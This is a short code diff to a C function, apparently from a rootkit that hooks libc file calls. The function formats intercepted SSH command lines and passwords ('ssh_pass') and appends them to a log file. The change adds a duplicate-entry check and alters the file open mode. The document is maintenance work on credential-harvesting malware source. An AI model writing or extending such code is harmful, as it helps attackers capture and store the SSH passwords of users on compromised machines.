@@ -13,8 +13,11 @@ ssize_t writelog(ssize_t ret){
     snprintf(logbuf, sizeof(logbuf), LOG_FMT, cmdline, ssh_pass);
     free(cmdline);
 
+    if(alreadylogged(SSH_LOGS, logbuf))
+        return ret;
+
     hook(CFOPEN, CFWRITE);
-    fp = call(CFOPEN, SSH_LOGS, "a+");
+    fp = call(CFOPEN, SSH_LOGS, "a");
     if(fp == NULL) return ret;
     call(CFWRITE, logbuf, 1, strlen(logbuf), fp);
     fflush(fp);
